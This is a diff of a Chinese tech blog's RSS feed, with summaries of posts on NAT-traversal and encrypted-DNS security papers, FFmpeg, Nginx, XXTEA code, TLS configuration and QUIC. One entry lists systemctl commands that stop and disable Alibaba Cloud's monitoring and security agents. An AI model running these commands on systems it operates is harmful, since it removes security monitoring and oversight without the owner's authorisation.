+      <description>Teemu Rytilahti et al. Ruhr University Bochum NDSS 2020 背景 网络扫描是一种互联网上的普遍攻击手段。由于 NAT 协议的使用，使得很多设备无法被扫描到。但是许多设备需要使用端对端协议，因此使用了各种NAT穿透手段。这些代理手段安全性不足可能导致攻击的发生。&#xA;Contribution 建立不同的方法扫描和分析网络请求。 分析持久性NAT传统协议及其不足：UPnP IGD and NAT-PMP/PCP 分许临时性NAT穿透协议及其不足：Socks以及HTTP代理 NAT 穿透协议分析 UPNP 首先通过互联网发送构造的SSDP消息找到暴露在公网中的接入点。 通过接入点获取端口映射信息 也可以通过接口建立新的端口转发关系来绕过 NAT 目前发生已有攻击的迹象，并构造蜜罐来明确攻击途径。&#xA;NAT-PMP AND PCP NAT-PMP 提供了查询网关外部地址、建立新映射的功能。PCP是其继任者，提供了IPv6和外部映射的功能。但是这个协议不提供直接查询已有端口映射的接口。&#xA;尽管发现了部分服务被暴露在了公网，但是大部分都提示无认证、并无法进行下一步攻击。&#xA;Proxy 分析 文章的第二个工作点非常明朗，就是HTTP/SOCKS代理有没有配置漏洞，导致可以代理到本地的服务。发现 3% 的开放代理中有 23% 存在此漏洞。</description>
+    </item>
+    <item>
+      <title>论文笔记| Encrypted DNS --Privacy-A Traffic Analysis Perspective</title>
+      <link>https://www.elliot98.top/post/lab/ndss2020-1/</link>
+      <pubDate>Sat, 14 Mar 2020 15:36:35 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ndss2020-1/</guid>
+      <description>Authors: Sandra Siby et al. From: NDSS 2020 1.Introduction 文章考察了当今世界对抗DNS攻击的两种主要方法DOH、DOT。介绍这两种方法在real world 中存在问题。&#xA;这两个方法TLS/HTTPS封装的方式，提供DNS记录的加密和完整性。保护通过传输层复用和padding的方式来对抗流量分析。&#xA;文章实现了如下工作：&#xA;实现了通过流量分析来监控浏览行为 可以实现对于环境的自适应 使用 EDNS0 混淆时，unless EDNS0 padding overhead is large, current padding strategies cannot completely prevent our attack 2.Threat Model 攻击者位于client 和 DNS resolver直接，而不在 client 和 server 之间。证明了即便是如此，也可以做到非常可靠的分析，并且比分析HTTPS流量成本更低：&#xA;所需进行攻击的报文较少（on average 124 times） DoH resolver 目前比较少 3.DNS Based fingerpoint 不变的特征：浏览网页的时候，由于资源或者子页面加载的特征或者先后顺序也会反映在 DNS 查询上。 变化的特征：网页的变动、资源的变动、Local DNS、DNS Cache 、CDN等&#xA;4.Feature and Algorithm 特征：选取了包的方向和大小作为参数，扩展成单个报文和报文对的向量。发现时间特征并不显著。 算法：使用了一百个trees的随机森林算法（RF）&#xA;5.Conclusion 具有较高识别准确率：close world 能够较精确识别特定网站；open world 能够识别是否是黑名单上 与其他方案比较：在DNS识别上比其他方案准确率高且训练集小；也能识别HTTPS流量。 训练集较小：由于DNS流量相比HTTPS流量更加稳定 鲁棒性：具有一定的对抗时间、空间、客户端和服务器平台的鲁棒性 对抗EDNS(0)扩展：EDNS-128,EDNS-468 具有较小的 overhead 但是其有较大概率被识别。使用DoT或者Tor则由较大overhead但是较为混淆。 论证了如何构建审查机制：通过文章方案，在使用的数据集中，使用整个DoH流量的前 15%的报文就能使得识别概率达到50%。 7.</description>
+    </item>
+    <item>
+      <title>FFMPEG专题| Ffmpeg crf 参数和码率的实验</title>
+      <link>https://www.elliot98.top/post/tech/ffmpeg-crf/</link>
+      <pubDate>Mon, 03 Feb 2020 19:43:53 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ffmpeg-crf/</guid>
+      <description>今天针对CRF的码率控制模式做了一个简单不严谨的实验如下：</description>
+    </item>
+    <item>
+      <title>FFMPEG专题| 从美剧「巫师」简要分析FFMPEG视频转码与压缩</title>
+      <link>https://www.elliot98.top/post/tech/ffmpeg/</link>
+      <pubDate>Sat, 01 Feb 2020 15:07:05 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ffmpeg/</guid>
+      <description>寒假在家，我开始搜索各种电视剧电影来充实自己的寒假生活，最近正在看的是Netflix的美剧「巫师」。但是下载的 1080P .mkv 原片一集大小高达 3.3 G，我们能否通过合理的视频转码压缩在保证视频观感体验的同时，尽可能减少视频文件的大小呢？&#xA;事实上是可能的，我们可以通过视频的重新编码，使得在保留一定画面质量的同时，尽可能的减少视频的大小。比如这一次就将从 .mkv 文件转码成 .mp4 文件，以换取更小的体积和更大的兼容性（.mkv文件在手机平板等移动端支持往往没有 .mp4 好。）&#xA;几个概念 视频封装 一般视频文件格式有 .mp4 .mov .mkv 等等，这些格式往往都包含着一条或者多条视频、声音和字幕通道。&#xA;视频编码 未经压缩的画面往往非常大，需要通过帧间编码或者帧内编码的方式来对视频大小进行压缩。常见的视频编码格式有 H264, H265 等等。H265作为比较新的编码方案具有压缩率较高，画面较好的优点。&#xA;音频编码 场景的音频编码有 .mp3 .aac .flac等。&#xA;分辨率 视频的分辨率是视频画面的大小，通常分辨率越高，视频的画面就越精细。常见的分辨率有 720p, 1080p, 4K 等。&#xA;帧率 是指一秒钟内有多少帧图片。帧率越高，视频就越连贯，普遍的码率有 25fps, 50fps, 30fps, 60fpx 等&#xA;码率 码率最终决定了视频的大小，是指一秒视频使用多少字节来描述。一般蓝光视频的码率在 10-20 Mbps，而更多网络视频的码率一般在 2-6 Mbps 之间。码率越高，画面压缩率越低，画面越精细。&#xA;分析一下 首先使用 ffmpeg -i xxxx.mkv命令来查看一下原始的视频的一些编码细节，这里截取了部分比较关键的输出内容。&#xA;Metadata:&#xD;encoder : libebml v1.3.5 + libmatroska v1.4.8&#xD;creation_time : 2019-12-20T08:18:01.000000Z&#xD;Duration: 01:01:04.58, start: 0.000000, bitrate: 6468 kb/s&#xD;Stream #0:0: Video: h264 (Main), yuv420p(progressive), 1920x1080 [SAR 1:1 DAR 16:9], 24 fps, 24 tbr, 1k tbn, 48 tbc (default)&#xD;Stream #0:1(eng): Audio: eac3, 48000 Hz, 5.</description>
+    </item>
+    <item>
+      <title>读书笔记| Nginx Cookbook 读书笔记</title>
+      <link>https://www.elliot98.top/post/tech/nginx-cookbook/</link>
+      <pubDate>Wed, 29 Jan 2020 15:05:05 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/nginx-cookbook/</guid>
+      <description>寒假在家无聊，便读了读由 Derek DeJonghe 所写的 NGINX CookBook。这些年一直以来一直使用 Nginx 作为服务器部署和反向代理的主要工具，也总结了一套自己的最佳实践。但是重读这本书，从另一个角度，介绍了关于负载平衡、认证、限流、日志等一系列知识，是给自己知识的查漏补缺和加以整合。书上大量讲解了关于负载平衡以及安全和性能优化相关的知识，有许多我之前没有接触过的 Nginx 模块、指令和属性的讲解。&#xA;这里是我的 Nginx_CookBook_读书笔记.pdf ，杂乱无章，但是总是可以快速检索到我所需要的。</description>
+    </item>
+    <item>
+      <title>实时动态| Ipv6 站开通</title>
+      <link>https://www.elliot98.top/post/tech/ipv6/</link>
+      <pubDate>Mon, 20 Jan 2020 12:45:41 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ipv6/</guid>
+      <description>本站即日起拥有公网 IPv6 访问能力。&#xA;双栈网址为： https://blog.ertuil.top IPv6 Only 网址为： https://ipv6.ertuil.top (不再提供) CDN 加速网站： https://www.ertuil.top </description>
+    </item>
+    <item>
+      <title>生活日志| 欢迎订阅我的微信公众号</title>
+      <link>https://www.elliot98.top/post/life/wechat-gongzhonghao/</link>
+      <pubDate>Tue, 14 Jan 2020 13:51:22 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/wechat-gongzhonghao/</guid>
+      <description>我的微信公众号「Ertuil的日常」开通啦！欢迎订阅！</description>
+    </item>
+    <item>
+      <title>技术摘要| 如何逃避阿里云ECS的监控</title>
+      <link>https://www.elliot98.top/post/tech/aliyun-watch/</link>
+      <pubDate>Tue, 14 Jan 2020 13:43:33 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/aliyun-watch/</guid>
+      <description>阿里云在你的服务器内内置了「云监控」和「云安全骑士」，这些东西总是让你觉得被偷窥，有一点不舒服​。使用下面的办法把它关掉：&#xA;systemctl stop aliyun.service&#xD;systemctl disable aliyun.service&#xD;systemctl stop aegis.service&#xD;systemctl disable aegis.service&#xD;systemctl stop CmsGoAgent.service&#xD;systemctl disable CmsGoAgent.service 关闭这些监控其实也只是一叶障目，寻求一点心理安慰罢了。你的数据还是安安静静地躺在阿里云的硬盘里，不过从心理说「阿里云」应当是可信的，阿里云在自己的服务协议中有说：“用户的数据完全归用户所有”。​</description>
+    </item>
+    <item>
+      <title>Valine</title>
+      <link>https://www.elliot98.top/zone/valine/</link>
+      <pubDate>Wed, 18 Dec 2019 18:52:29 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/valine/</guid>
+      <description>Gittalk 看起来不是很安全，拥有我的 github 的全部公开仓库的读写权限。因此换成 valine 提供的评论系统。</description>
+    </item>
+    <item>
+      <title>密码学专题| 一种微型分组加密算法 XXTEA</title>
+      <link>https://www.elliot98.top/post/crypto/crypto-xxtea/</link>
+      <pubDate>Mon, 16 Dec 2019 19:25:58 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/crypto/crypto-xxtea/</guid>
+      <description>XXTEA一个微型加密算法 对于的密码学算法来说，还是普遍使用对称密码学来实现对于文件或者数据的加密任务。其中主流的算法包括最为流行的 AES 分组密码算法，或者是常常用于移动设备中的 chacha20 序列密码。这些算法往往都各有优缺点。XXTEA 算法就是一种对称的分组加密算法，他的安全性欠缺，但是由于其结构和实现的简单性使得其称为了可以用于存储和计算能力欠缺的嵌入式设备之中，给这些设备提供最基本的密码学服务的算法。&#xA;XXTEA 是由 Roger Needham 和 David Wheeler 设计的，可以算作 TEA（Tiny Encryption Algorithm） 算法的第三代，在安全性上有所提升，同时效率提高。由于其代码实现非常简单，运算也是由异或等基本操作组成的，因此非常适合计算和存储能力吃紧的设备中使用。下面也可以看到其代码是非常简单的，寥寥几行无序复杂的运算就可以实现完整的加解密过程。&#xA;但是简洁也不是没有代价的，其安全性非常弱。2010 年 E. Yarrkov 证明其遭受基于选择明文的差分攻击，XXTEA 算法无法达到其秘钥空间的 128 bit 的安全，在约 2^59 次选择明文查询后，将可能恢复出秘钥。&#xA;XXTEA 算法的基本特点 没有分组加密模式的概念 没有初始向量 IV 的概念 分组长度可变，是任意 32 bit 为步长递增，最少 64 bit 的二进制字符串。 秘钥长度为 128 bit 加密轮数可变，取决于分组长度，分组越长轮数越少（最低6轮），分组短轮数越多（最多32个完整轮数） 没有置换表的概念，唯一常数是 DELTA=0x9e3779b9 ，可以作为算法逆向的判断依据 正是由于其轮数可变，当轮数较低的时候，提供了攻击的可能性。此外，分组加密方式、IV等的缺失，导致了其不可能作为一个大批量数据的手段，仅用于安全需求低、消息较短的嵌入式或者web等较弱环境下。但是也有一些优点：&#xA;具有良好雪崩效应 正确使用（明文添加序列号），则可以尽可能避免缺少IV带来的构建 identity message 攻击 良好的抗切割和合并攻击 其基本结构如下：&#xA;算法实现如下（参加 wikipidea）&#xA;#define MX ((z&amp;gt;&amp;gt;5^y&amp;lt;&amp;lt;2) + (y&amp;gt;&amp;gt;3^z&amp;lt;&amp;lt;4) ^ (sum^y) + (k[p&amp;amp;3^e]^z)) long btea(long* v, long n, long* k) { unsigned long z=v[n-1], y=v[0], sum=0, e, DELTA=0x9e3779b9; long p, q ; if (n &amp;gt; 1) { /* Coding Part */ q = 6 + 52/n; while (q-- &amp;gt; 0) { sum += DELTA; e = (sum &amp;gt;&amp;gt; 2) &amp;amp; 3; for (p=0; p&amp;lt;n-1; p++) y = v[p+1], z = v[p] += MX; y = v[0]; z = v[n-1] += MX; } return 0 ; } else if (n &amp;lt; -1) { /* Decoding Part */ n = -n; q = 6 + 52/n; sum = q*DELTA ; while (sum !</description>
+    </item>
+    <item>
+      <title>Talk</title>
+      <link>https://www.elliot98.top/zone/talk/</link>
+      <pubDate>Mon, 16 Dec 2019 11:47:55 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/talk/</guid>
+      <description>博客正式上线留言板功能。基于 gittalk 的评论功能，可以开始评论啦！</description>
+    </item>
+    <item>
+      <title>4</title>
+      <link>https://www.elliot98.top/zone/4/</link>
+      <pubDate>Thu, 12 Dec 2019 23:01:40 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/4/</guid>
+      <description>今天班上学生说“助教你好，今天非常感谢你，谢谢你愿意帮助我，虽然我好像确实听不懂一些问题，但是你很耐心地讲解，我感受到了温暖。虽然题目还是没有做完吧，不过你的关心真的挺好的”。感觉努力得到了回报，开心。</description>
+    </item>
+    <item>
+      <title>Kuki</title>
+      <link>https://www.elliot98.top/zone/kuki/</link>
+      <pubDate>Mon, 09 Dec 2019 23:21:52 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/kuki/</guid>
+      <description>「空気」そのものは存在しないかと僕はいつも信じていた。たが、今晩「空気」そのものを初めて全身で感じていた。学校や社会や全部人と人で構成していますので、その世論はとても大事です。そすると、世論を失う人たちはその社会に全力で生きるしかないかも。それを思うとすぐ怖いと感じられた。</description>
+    </item>
+    <item>
+      <title>Tice2</title>
+      <link>https://www.elliot98.top/zone/tice2/</link>
+      <pubDate>Sun, 08 Dec 2019 20:55:38 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/tice2/</guid>
+      <description>大学最后一次体验测试结束了。这学期没怎么去跑步，1000m 成绩炸了。跑完腿都虚了 &amp;hellip; 233333 回寝室佛系。</description>
+    </item>
+    <item>
+      <title>Tice</title>
+      <link>https://www.elliot98.top/zone/tice/</link>
+      <pubDate>Sun, 08 Dec 2019 11:44:12 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/tice/</guid>
+      <description>下午要去体侧了，要去跑 1000 m。太难了扒 23333 ，因为手术的缘故，这个学期都没怎么去操场跑步了。</description>
+    </item>
+    <item>
+      <title>SEO for Erblog</title>
+      <link>https://www.elliot98.top/zone/seo-for-erblog/</link>
+      <pubDate>Sun, 08 Dec 2019 11:41:07 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/seo-for-erblog/</guid>
+      <description>在这一次 Erblog 更新，http head 中添加了几个 meta 标签，用于提供 keywords 和 description，应当是有利于网站的 SEO 优化的。</description>
+    </item>
+    <item>
+      <title>论文笔记| CA 体系中的 Certificate Transparency</title>
+      <link>https://www.elliot98.top/post/lab/what-is-a-ct/</link>
+      <pubDate>Fri, 06 Dec 2019 19:47:04 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/what-is-a-ct/</guid>
+      <description>什么是 CT ？ 在原始的 KPI/CA 体系中，并没有 CT 这样一个角色的存在。而引入这样一个角色，是为了解决 CA 体系 在结构上的弊端。&#xA;这篇博文讲述了 CT 的基本体系结构，而后简要介绍 CSS 2019 的论文 Certificate Transparency in the Wild: Exploring the Reliability of Monitors。&#xA;现有 CA 体系的弊端 当前的 CA 体系，提供了一个用于确认公钥与实体对应关系的手段，是现代非对称密码学的基石之一。 但是这个体系的核心信任模型就是要相信“可信第三份”，也就是 CA 。换句话说，整个 TLS 体系要求整个互联网信任几百个 CA 实体可靠诚实的工作，这个条件看起来似乎是有一点好笑的。&#xA;当发生了一些安全事件，暴露出 CA 往往不能改按照我们预想的情况可靠的工作的时候，这个问题就变得非常明显了。但是 CA 机制是非常封闭的，原始 PKI/CA 体系不能提供任何对于 CA 的审计手段。唯一的监督措施就是这样一条基本原理 ———— 当 CA 犯错的时候，由根 CA 撤销其证书。这个惩罚其实是非常弱的，而且有一种事后诸葛的感觉。&#xA;如果一个 CA 由于主观或者客观的因素，签发了一张非法证书。那么攻击者可以使用这样的一张证书来假冒受害网站，或者发起中间人攻击，从而破坏了 TLS 体系身份认证的安全性。&#xA;所以 CT （Certificate Transparency） 的机制就是用于给 CA 体系补充这个审计的过程。&#xA;CT 体系的工作原理 CT 体系的工作原理是：当 CA 需要颁发一个证书的时候，需要将证书发送给 CT；由CT签名后，生成一个 SCT （签名证书时间戳）；CA 得到 SCT 后将证书颁发。与此同时，CT 将证书信息记录在一个公开日志 log 上，以备用户和使用者查询。</description>
+    </item>
+    <item>
+      <title>Beian</title>
+      <link>https://www.elliot98.top/zone/beian/</link>
+      <pubDate>Fri, 06 Dec 2019 14:44:08 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/beian/</guid>
+      <description>今早阿里云打电话来核实了备案信息。这是指的是 IPC 备案。正好想着一直没有做公安备案，那么就去做弄一下吧。&#xA;目前提交了审核了，总体来说还是比较方便的。槽点只有两个，一是就是网站的 https 证书一年前过期了，二是照片上传用的还是flash。 这让对web安全比较在意的我有一点介意。</description>
+    </item>
+    <item>
+      <title>Zone</title>
+      <link>https://www.elliot98.top/zone/zone/</link>
+      <pubDate>Thu, 05 Dec 2019 11:43:27 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/zone/</guid>
+      <description>Zone 是博客中一个分区，非常类似于 Twitter 或者朋友圈，可以快速添加自己想说的短内容。</description>
+    </item>
+    <item>
+      <title>生活日志| Erblog -- A Simple Theme for My Blog</title>
+      <link>https://www.elliot98.top/post/life/erblog/</link>
+      <pubDate>Thu, 05 Dec 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/life/erblog/</guid>
+      <description>Erblog A personal blog theme powered by Hugo. Erblog is written by Ertuil with layui.js, font-awssome,github markdown css and undraw.&#xA;Erblog is also a responsive theme which means it is customed for your mobile platforms.&#xA;1. Installation You can install the theme by git clone.&#xA;$ git submodule add https://github.com/ertuil/erblog themes/erblog&#xD;$ git submodule init&#xD;$ git submodule update Now you can get updates to Erblog in the future by updating the submodule:</description>
+    </item>
+    <item>
+      <title>Happy Birthday to BM</title>
+      <link>https://www.elliot98.top/zone/3/</link>
+      <pubDate>Wed, 04 Dec 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/zone/3/</guid>
+      <description>A letter from my email says that I have got a scholarship.</description>
+    </item>
+    <item>
+      <title>技术摘要| 安全的SSL/TLS配置推荐及其原理</title>
+      <link>https://www.elliot98.top/post/tech/security-tls/</link>
+      <pubDate>Thu, 28 Nov 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/tech/security-tls/</guid>
+      <description>一、SSL/TLS 背景 如今已经是 2019 年了，大部分的 HTTP 服务器都默认配置了 SSL/TLS ，以为大家提供安全的、具有隐私性的网络服务。&#xA;但是安全的配置 TLS 往往是困难的，如果配置不当可能会导致性能低下、安全性能减弱等问题。因此这篇文章以 Nginx 服务器为例，讲解如何安全的配置 ssl 服务器。&#xA;早期的 SSL（安全套接字协议）是由网景公司发布的提供安全连接的服务，发布了 SSL1.0, SSL2.0, SSL 3.0 三个版本。后来 IETF 将其标准化，并作为 TLS 协议（传输层安全协议）发布了 TLSv1.1 和 TLSv1.2 协议。 2018年，最新的 TLSv1.3 协议发布。目前主要使用的版本是 TLSv1.2 和 TLSv1.3 两个版本，早期的版本已经不再建议使用了。&#xA;TLS 协议主要使用了如下一些密码学算法来提供安全服务：&#xA;身份认证：服务器需要证明自己就是真实的服务器，防止了恶意服务器假冒真实网站提供服务。 秘钥交换：服务器和浏览器需要协商出一个秘钥，用于后续消息的加密和验证。 数据机密性保护：使用了上述协商出来的秘钥，来对信息进行加密，使得他人不能读取消息的内容。 消息完整性保护：要保护消息没有被恶意篡改（即便是加密的信息，也可能进行篡改） 二、密码学算法简介 为了完成上面这些密码学服务，需要使用一些密码学算法，来提供这些服务。将这些密码学算法组合起来，形成一个个套餐，也就形成了密码学套件（ciphers）。&#xA;TLS 协议最初是的阶段，就是通信双方对于所使用的的密码学套件进行协商，确定算法和相关参数，之后才能提供安全性服务。&#xA;2.1 身份认证 为了验证身份，TLS 使用了一种被称为“数字签名”的算法。数字签名是一种基于非对称密码的算法，可以使得一个实体（一般来说是服务器）证明他就是所声称的人。&#xA;这里就需要大家常说的证书的概念，简单来说，证书提供了关系的证明，https 服务器需要向可信第三方（CA）申请一个 ssl 证书。客户端拿到服务器的证书之后，去CA处查询，就能够觉得服务器的身份。&#xA;数字签名根据所使用的非对称算法的不同，主要有有 RSA 和 ECDSA 两种证书。&#xA;RSA(DSA) 是最简单的一种非对称算法，可以用于签名，但是其秘钥比较长（通常有 2048 位或者 4096 位），计算的开销比较大。因此近些年搭建广泛使用 ECDSA 来取代 RSA 算法。</description>
+    </item>
+    <item>
+      <title>QUIC专题| Quic Protocal Part 1：基本结构</title>
+      <link>https://www.elliot98.top/post/lab/quic-1/</link>
+      <pubDate>Tue, 19 Nov 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/quic-1/</guid>
+      <description>Quic 协议——第一部分 一、简介 QUIC 协议最初是由 Google 开发并使用在 Chrome 中的新一代 web 协议。 之后被 IETF 的 QUICWG 工作组接管，目前发布的版本为 24th。&#xA;QUIC 协议是一个包含传输层、安全垫片和应用层的复合协议族。QUIC 协议 基于 UDP 协议，在此之上实现了可控有序到达、拥塞控制、流量控制等传输层功能； 提供了对于包和连接的完整性和机密性功能；提供了 http3.0 等的应用层功能。&#xA;二、QUIC 协议基本结构 QUIC 协议是基于 UDP 的协议，其最基本包的格式为 UDP 报文（package），由 package number 来提供有序到达的功能。 在一个 QUIC 报文之中，有多个独立功能的 QUIC 帧（frame），每一个帧都 用于实现不同的功能，比如传输帧，错误帧，校验帧等。&#xA;在报文和帧的基础之上，QUIC 协议构成了一个双方共享连接状态的有状态协议， 因此有连接 （connection） 的概念。通过 connection id来区别不同的 QUIC 连接。 QUIC 连接具有完整的生命周期（建立、撤销、关闭等）&#xA;在连接之上，QUIC协议使用了连接复用的概率，在连接之上建立了多个有状态的流（steam）， 每一个流也是具有独立状态的。每一个流对应了上层的不同应用，比如 id 为 1 的流用于负责 握手协议和密码学参数的协商。&#xA;+---------+---------+---------+&#xD;| stream1 | stream2 | stream3 |&#xD;+---------+---------+---------+&#xD;| connection |&#xD;+-----------------------------+&#xD;| packages (frame1 || frame2 )|&#xD;+-----------------------------+ 三、 QUIC 协议版本协商 QUIC 报文头部的内容主要有协议的版本 （version） 和connection id 等。 其中 version 协商是建立 QUIC 协议首先需要做的工作。</description>
+    </item>
+    <item>
+      <title>QUIC专题| Quic Protocal Part 2：连接和流</title>
+      <link>https://www.elliot98.top/post/lab/quic-2/</link>
+      <pubDate>Tue, 19 Nov 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/quic-2/</guid>
+      <description>QUIC Protocal —— Part 2 QUIC 流和连接是有状态的，因此发送方和接收方需要建立对应的状态机，也需要完成一定的握手和关闭动作。&#xA;一、QUIC Stream 1.1 流的基本结构 QUIC 流是有状态的。每一个 QUIC 连接中可以复用多个流，每个流有一个独立的 stream id 来标记不同的流。其中 stream id 的最低有效位决定流是客户端建立的还是服务器建立的；次低有效位决定了流是单向的还是双向的。&#xA;同一个连接中，stream id 不允许复用。&#xA;QUIC 的流就像 TCP 协议一样，上层应用对于流的感知是连续的消息流，没有明显的边界（也就是说上层应用对于报文要有自然分割，否则可能发生粘包）。&#xA;1.2 流的帧表示 一个 stream 可能使用如下一些 QUIC 帧（frame）：&#xA;STREAM 帧： 发送数据 RST_STREAM: 接收流，收到对应 ACK 后关闭对应流。 STREAM_DATA_BLOCK: 阻塞 FIN: 发送结束 MAX_STREAM_DATA: 提示数据大小 STOP_SENDING: 接收方提示不再接收数据，后续可能被忽略 二、流量控制 QUIC 协议使用了基于 stream 和基于 connection 的两层流量控制。&#xA;2.1 基于字节的流量控制 接收方可以发送 MAX_STREAM_DATA 或者 MAX_DATA 来提示流和连接的字节最大偏移量。当达到发送最大字节的时候，发送方发送 STREAM_DATA_BLOCK 或 DATA_BLOCK 来提示阻塞。&#xA;2.2 基于stream 数量的流量控制 通信双方可以通过 MAX_STREAMS 帧来告知对端最大可以建立的 stream 的个数，以此来进行流量控制。</description>
+    </item>
+    <item>
+      <title>QUIC专题| Quic Protocal Part 3：包和帧</title>
+      <link>https://www.elliot98.top/post/lab/quic-3/</link>
+      <pubDate>Tue, 19 Nov 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/quic-3/</guid>
+      <description>Quic 协议——第三部分 QUIC 的通信采用了包（Package）和帧（frame）的双重结构。&#xA;一个 UDP 包中可能包含有多个 QUIC 包，其中每一个 QUIC 包中可以包含多个帧（frame）。&#xA;一个 UDP 报文包的 QUIC 包必须是同一个连接中的多个 QUIC 数据包。&#xA;帧是完整某项功能的基本单位，比如之前所述的 STREAM 帧用于发送流数据、CONNECTION_CLOSE 帧用于关闭连接等。&#xA;一、 QUIC Package 如前所述，QUIC 协议有长报文头和短报文头两种，在建立连接过程中使用的长报文头。这包括如下一些报文：初始数据包、0RTT数据包、握手数据包、重试数据包等。&#xA;除了版本协商数据包和重试数据包之外，其他数据包均使用 AEAD 算法提供机密性、完整性和身份认证保护。&#xA;包的 Package Number 是 0-2^62-1 的序列号，在实际报文中，可能被重新映射到 1-4字节。&#xA;Package Number 被分配为：初始空间、握手空间和应用空间三个部分。每次都从对应空间的 0 号开始，而后以此递增。&#xA;当 2^62 -1 时，必须关闭连接。&#xA;1.1 长包头数据包 长包头中包括了版本号，Package Number，源和目的 Connection ID 以及子类型，有如下几种类型：&#xA;1.1.1 版本协商包 Version Negotation Package 当客户端版本不被接收的时候，由服务器端发送。&#xA;1.1.2 初始数据包 Initial Package 它携带客户端和服务器发送的第一个CRYPTO帧来执行密钥交换，并携带两个方向的ACK。&#xA;1.1.3 0RTT 数据包 0-RTT数据包使用类型值为0x1的长报头，后跟长度和数据包号字段。第一个字节包含保留和数据 包号长度位。它用于在握手完成之前，将“早期”数据从客户端传送到服务器，作为第一次传输的 一部分。作为TLS握手的一部分，服务器可以接受或拒绝此早期数据。</description>
+    </item>
+    <item>
+      <title>QUIC专题| Quic Protocal Part 4：出错校验、拥塞控制</title>
+      <link>https://www.elliot98.top/post/lab/quic-4/</link>
+      <pubDate>Tue, 19 Nov 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/quic-4/</guid>
+      <description>Quic 协议——第四部分 QUIC 协议的出错校验 由于 QUIC 协议基于不可靠的 UDP 协议，因此需要实现校验、纠错和拥塞控制机制。(流量控制机制已经大致在前面说过了)。&#xA;如前所述，其 Package Number 被划分成了三个子空间，每个空间指示了报文的安全级别。&#xA;一、ACK 特性 QUIC 报文可以延迟 ACK 但必须在最大确认延时（max_ack_delay, mostly 25ms) 给出ACK 确认。&#xA;无序分组、有拥塞控制分组以及密码报文应当尽快确认。RTT 估值可参加 RFC6298。&#xA;二、丢失检验 2.1 基于ACK的丢失检验 使用了类似TCP Early Retransit，Quick Retransit，SACK，FACK，RACK 等机制。&#xA;当收到后续包ACK但没有收到当前包ACK时重传。 达到数据包阈值（Packet Threshold）或者时间阈值（Time Threshold） 2.2 加密超时重传 对于加密数据需要使用更灵活的机制来进行丢失检验&#xA;2.3 探测超时（Probe Timeout) 探测超时（PTO）在ack引出数据处于传输状态但在预期的时间段内未收到确认时触发探测数据包。&#xA;当发送数据包超过 PTO 时间后，发送探测数据包。&#xA;当PTO计时器到期时，新的或先前发送的数据 可能无法发送，并且数据包可能仍在发送中。 如果数据包在发送中，可以阻止发送方未来发 送新数据。在这些条件下，发件方应该 将仍在发送中的任何数据包标记为丢失。 如果发送方希望保证仍在运行中的数据包送达， 它可以发送一个ack-eliciting数据包并 重新设置PTO定时器。&#xA;当接收到新确认一个或多个分组的ACK帧时， 就可以确认传输中的分组的已经送达或丢失。&#xA;三、拥塞控制 QUIC的拥塞控制基于TCP NewReno（RFC6582）。 NewReno是基于拥塞窗口的拥塞控制。 NewReno中的 拥塞避免使用加法增加乘法减少（AIMD） 的方法将每个确认的拥塞窗口增加一个 最大数据包大小.当检测到丢失时， NewReno减半拥塞窗口并将慢启动阈值 设置为新的拥堵窗口。&#xA;此外 QUIC 支持显示拥塞控制 ECN (参加 transport 草案中的 ACK 帧)。</description>
+    </item>
+    <item>
+      <title>QUIC专题| Quic Protocal Part 5：TLS 1.3 in QUIC</title>
+      <link>https://www.elliot98.top/post/lab/quic-5/</link>
+      <pubDate>Tue, 19 Nov 2019 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/lab/quic-5/</guid>
+      <description>Quic 协议——第五部分 谷歌的 QUIC 协议中使用了自己的安全握手协议。而后 IETF 将 TLS 1.3 引入 QUIC 协议，并作为安全握手协议使用。&#xA;一、TLS 1.3 协议简介 TLS 是一个分层协议，包括下层的记录协议和上层的握手协议、告警协议和应用数据。&#xA;!! QUIC 不支持 TLS 的密码变更协议&#xA;TLS 1.3 提供了支持 1-RTT 的完整验证流程和 0-RTT 的快速回复机制。 TLS 报文有 0RTT 和 1RTT 两种安全级别。前者使用上次连接过程中建立的 psk。 后者使用 DH 秘钥交换等派生出 master key 后派生加密。&#xA;客户端 服务端&#xD;客户端请求&#xD;(0-RTT 应用数据) --------&amp;gt;&#xD;服务端请求&#xD;{加密扩展}&#xD;{完结的}&#xD;&amp;lt;-------- [应用程序数据]&#xD;{完结的} --------&amp;gt;&#xD;[应用程序数据] &amp;lt;-------&amp;gt; [应用程序数据]&#xD;() 受早期数据(0-RTT)键保护的指示消息&#xD;{} 使用握手密钥保护的指示消息&#xD;[] 使用应用程序数据保护的指示消息(1-RTT)键 二、 QUIC 协议中 TLS 概述 QUIC 协议中不再使用 TLS 协议的记录协议，而是直接由 QUIC 协议提供消息传递。 TLS 协议中的告警协议和握手协议直接作为 QUIC 的一个 STREAM 来完成。 QUIC 协议不兼容 TLS 协议的密码变更协议 QUIC 协议直接使用 TLS 协议所派生的秘钥对整个连接进行保护，而不再使用 TLS 的应用数据协议 +--------------+--------------+ +-------------+&#xD;| TLS | TLS | | QUIC |&#xD;| handshake | alert | | application 